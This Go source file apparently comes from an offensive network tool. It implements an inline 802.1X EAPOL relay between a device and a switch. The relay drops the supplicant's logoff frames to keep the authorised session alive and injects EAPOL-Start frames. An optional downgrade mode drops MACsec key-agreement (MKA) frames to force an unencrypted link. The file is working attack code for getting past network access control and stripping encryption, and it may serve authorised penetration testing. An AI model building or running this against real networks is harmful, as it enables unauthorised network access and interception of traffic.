package eapol

import (
	"context"
	"fmt"
	"net"
	"sync"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// Relay transparently forwards EAPOL frames between the supplicant (real device)
// on ifaceA and the authenticator (switch) on ifaceB.
//
// The relay is bidirectional:
//   - Switch→Device: EAPOL frames arriving on ifaceB are injected onto ifaceA
//   - Device→Switch: EAPOL frames arriving on ifaceA are injected onto ifaceB
//
// The relay also monitors the exchange:
//   - Detects EAP-Success/Failure to signal auth complete
//   - Detects EAPOL-Key (MKA) for MACsec negotiation
//   - Handles re-authentication transparently
//   - Optionally suppresses EAPOL-Logoff from the supplicant
type Relay struct {
	ifaceA  string // Device port (supplicant side)
	ifaceB  string // Switch port (authenticator side)
	session *AuthSession
	logFunc func(string)

	mu             sync.Mutex
	suppressLogoff bool
	injectStart    bool
	strictAuthMAC  bool
	strictVLAN     bool
	initialFrame   []byte
	modeName       string
	downgrader     *Downgrader
	authSignal     chan AuthResult

	// Log deduplication
	lastReqMethod  EAPMethod
	lastRespMethod EAPMethod
	startLoggedDev bool
	startLoggedSwi bool
	successLogged  bool
	failureLogged  bool
}

// NewRelay creates a new EAPOL relay between two interfaces.
// ifaceA = device/supplicant side, ifaceB = switch/authenticator side.
func NewRelay(ifaceA, ifaceB string, session *AuthSession, logFunc func(string)) *Relay {
	if logFunc == nil {
		logFunc = func(string) {}
	}
	return &Relay{
		ifaceA:         ifaceA,
		ifaceB:         ifaceB,
		session:        session,
		logFunc:        logFunc,
		suppressLogoff: true, // Default: suppress logoff to keep session alive
		injectStart:    true, // Manual relay prompts the authenticator by default
		strictAuthMAC:  true, // Manual relay pins authenticator direction once learned
		strictVLAN:     true, // Manual relay pins VLAN once learned
		modeName:       "EAPOL relay",
		authSignal:     make(chan AuthResult, 8), // Buffered to avoid dropping re-auth results
	}
}

// SetSuppressLogoff controls whether EAPOL-Logoff from the supplicant is dropped.
func (r *Relay) SetSuppressLogoff(suppress bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.suppressLogoff = suppress
}

// SetInjectStart controls whether the relay emits an EAPOL-Start after it is armed.
func (r *Relay) SetInjectStart(enabled bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.injectStart = enabled
}

// SetStrictAuthenticator controls whether switch-side EAPOL must keep the first
// observed authenticator source MAC. Transparent passthrough keeps this disabled
// because stacks and some switches may source different EAPOL phases differently.
func (r *Relay) SetStrictAuthenticator(enabled bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.strictAuthMAC = enabled
}

// SetStrictVLAN controls whether EAPOL is pinned to the first observed VLAN.
func (r *Relay) SetStrictVLAN(enabled bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.strictVLAN = enabled
}

// SetInitialFrame queues the first device-side frame that triggered MAC lock for
// forwarding after relay capture goroutines are armed.
func (r *Relay) SetInitialFrame(frame []byte) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.initialFrame = append([]byte(nil), frame...)
}

// SetModeName changes the short name used in relay logs.
func (r *Relay) SetModeName(name string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if name != "" {
		r.modeName = name
	}
}

// EnableDowngrade activates MACsec downgrade (drops EAPOL-Key/MKA frames).
func (r *Relay) EnableDowngrade() {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.downgrader = NewDowngrader()
	r.session.SetState(StateDowngrading)
	r.logFunc("[MACSEC] Downgrade enabled: EAPOL-Key/MKA frames will be dropped.")
}

// Start begins bidirectional EAPOL relay. This runs until the context is cancelled.
// It handles the full lifecycle including initial auth, re-auth, and logoff suppression.
func (r *Relay) Start(ctx context.Context) error {
	r.session.SetState(StateRelaying)

	// Open raw pcap handles on both interfaces for EAPOL.
	handleA, err := pcap.OpenLive(r.ifaceA, 65535, true, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("opening %s for EAPOL relay: %w", r.ifaceA, err)
	}
	defer handleA.Close()

	handleB, err := pcap.OpenLive(r.ifaceB, 65535, true, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("opening %s for EAPOL relay: %w", r.ifaceB, err)
	}
	defer handleB.Close()

	// BPF filter on both to only see EAPOL frames.
	if err := handleA.SetBPFFilter(BPFFilter); err != nil {
		return fmt.Errorf("BPF filter on %s: %w", r.ifaceA, err)
	}
	if err := handleB.SetBPFFilter(BPFFilter); err != nil {
		return fmt.Errorf("BPF filter on %s: %w", r.ifaceB, err)
	}

	r.mu.Lock()
	modeName := r.modeName
	r.mu.Unlock()
	r.logFunc(fmt.Sprintf("[RELAY] %s active: %s (device) ⟷ %s (switch)", modeName, r.ifaceA, r.ifaceB))

	// Launch two goroutines for bidirectional relay.
	var wg sync.WaitGroup
	wg.Add(2)

	// Switch→Device: frames from authenticator relayed to supplicant.
	go func() {
		defer wg.Done()
		r.relayDirection(ctx, handleB, handleA, "switch→device")
	}()

	// Device→Switch: frames from supplicant relayed to authenticator.
	go func() {
		defer wg.Done()
		r.relayDirection(ctx, handleA, handleB, "device→switch")
	}()

	r.mu.Lock()
	initialFrame := append([]byte(nil), r.initialFrame...)
	injectStart := r.injectStart
	r.mu.Unlock()

	// Forward the frame that triggered MAC lock after capture goroutines are armed.
	// In inline mode this avoids losing the first EAPOL-Start/DHCP/ARP packet while
	// the switch-facing port was intentionally held down.
	if len(initialFrame) > 0 {
		if err := handleB.WritePacketData(initialFrame); err != nil {
			r.logFunc(fmt.Sprintf("[RELAY] initial trigger frame injection error: %v", err))
		} else {
			r.logFunc("[RELAY] initial device frame forwarded to switch side")
		}
	}

	// Manual relay can prompt the authenticator, but transparent passthrough disables
	// this and only forwards frames that naturally appear on the wire.
	if injectStart && r.session.SupplicantMAC != nil {
		r.session.mu.Lock()
		vlanID := r.session.VLANID
		supplicantMAC := copyMAC(r.session.SupplicantMAC)
		r.session.mu.Unlock()
		if err := InjectEAPOLStartWithVLAN(r.ifaceB, supplicantMAC, vlanID, r.logFunc); err != nil {
			r.logFunc(fmt.Sprintf("[!][802.1X] EAPOL-Start injection failed (non-fatal): %v", err))
		}
	}

	wg.Wait()
	return nil
}

// WaitForAuth blocks until authentication succeeds, fails, or the context is cancelled.
func (r *Relay) WaitForAuth(ctx context.Context) (*AuthResult, error) {
	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	case result := <-r.authSignal:
		return &result, nil
	}
}

// relayDirection forwards EAPOL frames from src to dst, inspecting them along the way.
func (r *Relay) relayDirection(ctx context.Context, src, dst *pcap.Handle, label string) {
	packetSource := gopacket.NewPacketSource(src, src.LinkType())
	packets := packetSource.Packets()

	for {
		select {
		case <-ctx.Done():
			return
		case packet := <-packets:
			if packet == nil {
				continue
			}

			ethLayer := packet.Layer(layers.LayerTypeEthernet)
			if ethLayer == nil {
				continue
			}
			eth, _ := ethLayer.(*layers.Ethernet)
			if !r.acceptFrame(packet, eth, label) {
				continue
			}

			eapolLayer := packet.Layer(layers.LayerTypeEAPOL)
			if eapolLayer == nil {
				continue
			}
			eapol, _ := eapolLayer.(*layers.EAPOL)

			// ── Inspect the EAPOL frame ────────────────────────────────

			shouldDrop := false

			switch eapol.Type {
			case layers.EAPOLTypeEAP:
				r.handleEAPFrame(packet, eth, label)

			case layers.EAPOLTypeStart:
				r.mu.Lock()
				shouldLog := false
				if label == "device→switch" && !r.startLoggedDev {
					r.startLoggedDev = true
					shouldLog = true
				} else if label == "switch→device" && !r.startLoggedSwi {
					r.startLoggedSwi = true
					shouldLog = true
				}
				r.mu.Unlock()
				if shouldLog {
					r.logFunc(fmt.Sprintf("[RELAY] %s: EAPOL-Start from %s", label, eth.SrcMAC))
				}

			case layers.EAPOLTypeLogOff:
				r.mu.Lock()
				suppress := r.suppressLogoff
				r.mu.Unlock()

				if suppress {
					r.logFunc(fmt.Sprintf("[!][RELAY] %s: EAPOL-Logoff received from %s", label, eth.SrcMAC))
					r.logFunc("           DROPPING PACKET to keep session alive")
					r.session.RecordDrop()
					shouldDrop = true
				} else {
					r.logFunc(fmt.Sprintf("[RELAY] %s: EAPOL-Logoff from %s — forwarding", label, eth.SrcMAC))
				}

			case layers.EAPOLTypeKey:
				r.logFunc(fmt.Sprintf("[RELAY] %s: EAPOL-Key frame from %s — forwarding", label, eth.SrcMAC))

			case layers.EAPOLType(5):
				// EAPOL-MKA carries MACsec key agreement.
				r.session.mu.Lock()
				isFirstTime := !r.session.MACsecDetected
				r.session.MACsecDetected = true
				r.session.mu.Unlock()

				r.mu.Lock()
				dg := r.downgrader
				r.mu.Unlock()

				// Use the Downgrader's ShouldDrop to decide, keeping logic in one place.
				isDroppedByRule := dg != nil && dg.ShouldDrop(packet)

				if isDroppedByRule {
					r.logFunc(fmt.Sprintf("[!][MACSEC] %s: MACsec (EAPOL Type %d) discovered. DROPPING PACKET to force downgrade", label, eapol.Type))
					r.session.RecordDrop()
					shouldDrop = true
				} else if isFirstTime {
					if dg == nil || !dg.IsEnabled() {
						r.logFunc(fmt.Sprintf("[MACSEC] %s: MACsec (EAPOL Type %d) key negotiation detected but DWNGRD IS DISABLED on proxy", label, eapol.Type))
					} else {
						// Downgrade is active, but this packet type (e.g. Type 3) is allowed to securely pass.
						r.logFunc(fmt.Sprintf("[MACSEC] %s: MACsec (EAPOL Type %d) key negotiation safely bypassed from %s", label, eapol.Type, eth.SrcMAC))
					}
				}
			}

			// ── Forward the frame ──────────────────────────────────────

			if !shouldDrop {
				rawData := packet.Data()
				if err := dst.WritePacketData(rawData); err != nil {
					r.logFunc(fmt.Sprintf("[RELAY] %s: injection error: %v", label, err))
				} else {
					r.session.RecordRelay()
				}
			}
		}
	}
}

func (r *Relay) acceptFrame(packet gopacket.Packet, eth *layers.Ethernet, label string) bool {
	r.mu.Lock()
	strictAuthMAC := r.strictAuthMAC
	strictVLAN := r.strictVLAN
	r.mu.Unlock()

	r.session.mu.Lock()
	defer r.session.mu.Unlock()

	supplicantMAC := r.session.SupplicantMAC
	if len(supplicantMAC) == 0 {
		return false
	}

	switch label {
	case "device→switch":
		// Ignore reflected switch frames captured on the device-side handle.
		if !macEqual(eth.SrcMAC, supplicantMAC) {
			return false
		}
	case "switch→device":
		// Ignore our own injected supplicant frames captured by the switch-side handle.
		if macEqual(eth.SrcMAC, supplicantMAC) {
			return false
		}
		if len(r.session.AuthenticatorMAC) == 0 && eth.SrcMAC[0]&1 == 0 {
			r.session.AuthenticatorMAC = copyMAC(eth.SrcMAC)
		}
		if strictAuthMAC && len(r.session.AuthenticatorMAC) > 0 && !macEqual(eth.SrcMAC, r.session.AuthenticatorMAC) {
			return false
		}
	default:
		return false
	}

	if dot1qLayer := packet.Layer(layers.LayerTypeDot1Q); dot1qLayer != nil {
		dot1q, _ := dot1qLayer.(*layers.Dot1Q)
		if dot1q.VLANIdentifier != 0 {
			if r.session.VLANID == 0 {
				r.session.VLANID = dot1q.VLANIdentifier
			} else if r.session.VLANID != dot1q.VLANIdentifier {
				if !strictVLAN {
					return true
				}
				return false
			}
		}
	}

	return true
}

// handleEAPFrame inspects an EAP frame inside an EAPOL packet.
func (r *Relay) handleEAPFrame(packet gopacket.Packet, eth *layers.Ethernet, label string) {
	eapLayer := packet.Layer(layers.LayerTypeEAP)
	if eapLayer == nil {
		r.logFunc(fmt.Sprintf("[RELAY] %s: EAPOL-EAP frame (no EAP layer parsed) from %s", label, eth.SrcMAC))
		return
	}

	eap, _ := eapLayer.(*layers.EAP)

	// Track the authenticator MAC from the switch side.
	if label == "switch→device" {
		r.session.mu.Lock()
		if len(r.session.AuthenticatorMAC) == 0 {
			r.session.AuthenticatorMAC = copyMAC(eth.SrcMAC)
		}
		r.session.mu.Unlock()
	}

	// Track the EAP ID for session correlation.
	r.session.mu.Lock()
	r.session.LastEAPID = eap.Id
	r.session.mu.Unlock()

	switch eap.Code {
	case layers.EAPCodeRequest:
		method := eapTypeToMethod(uint8(eap.Type))
		r.mu.Lock()
		r.startLoggedDev = false
		r.startLoggedSwi = false
		r.successLogged = false
		r.failureLogged = false
		if r.lastReqMethod != method {
			r.lastReqMethod = method
			// Included the ID previously, but removed for dedup since fragment IDs change constantly.
			r.logFunc(fmt.Sprintf("[RELAY] %s: EAP-Request Type=%s from %s", label, method, eth.SrcMAC))
		}
		r.mu.Unlock()

		// Update method if we see something more specific than Identity.
		if method != MethodUnknown && method != MethodIdentity {
			r.session.mu.Lock()
			if r.session.Method == MethodUnknown || r.session.Method == MethodIdentity {
				r.session.Method = method
				r.logFunc(fmt.Sprintf("[+][802.1X] EAP method negotiated: %s", method))
			}
			r.session.mu.Unlock()
		} else if method == MethodIdentity {
			r.session.mu.Lock()
			if r.session.Method == MethodUnknown {
				r.session.Method = MethodIdentity
			}
			// Check if this is a re-auth (we were already authenticated).
			if r.session.State == StateAuthenticated {
				r.session.ReauthCount++
				r.session.State = StateRelaying
				r.logFunc(fmt.Sprintf("[*][802.1X] Re-authentication #%d initiated by authenticator", r.session.ReauthCount))
			}
			r.session.mu.Unlock()
		}

	case layers.EAPCodeResponse:
		method := eapTypeToMethod(uint8(eap.Type))
		r.mu.Lock()
		if r.lastRespMethod != method {
			r.lastRespMethod = method
			r.logFunc(fmt.Sprintf("[RELAY] %s: EAP-Response Type=%s from %s", label, method, eth.SrcMAC))
		}
		r.mu.Unlock()

	case layers.EAPCodeSuccess:
		r.mu.Lock()
		shouldLog := !r.successLogged
		r.successLogged = true
		r.mu.Unlock()
		if shouldLog {
			r.logFunc(fmt.Sprintf("[+][802.1X] EAP-Success received (ID=%d) port AUTHORIZED", eap.Id))
		}
		r.session.MarkAuthenticated()

		// Non-blocking send so the relay doesn't deadlock if nobody is waiting.
		r.session.mu.Lock()
		method := r.session.Method
		macsec := r.session.MACsecDetected
		r.session.mu.Unlock()
		select {
		case r.authSignal <- AuthResult{Success: true, Method: method, MACsecDetected: macsec}:
		default:
		}

	case layers.EAPCodeFailure:
		r.mu.Lock()
		shouldLog := !r.failureLogged
		r.failureLogged = true
		r.mu.Unlock()
		if shouldLog {
			r.logFunc(fmt.Sprintf("[!][802.1X] EAP-Failure received (ID=%d) — authentication REJECTED", eap.Id))
		}
		r.session.MarkFailed()

		r.session.mu.Lock()
		method := r.session.Method
		macsec := r.session.MACsecDetected
		r.session.mu.Unlock()
		select {
		case r.authSignal <- AuthResult{Success: false, Method: method, MACsecDetected: macsec}:
		default:
		}
	}
}

// copyMAC creates an independent copy of a MAC address.
func copyMAC(mac net.HardwareAddr) net.HardwareAddr {
	dup := make(net.HardwareAddr, len(mac))
	copy(dup, mac)
	return dup
}

func macEqual(a, b net.HardwareAddr) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
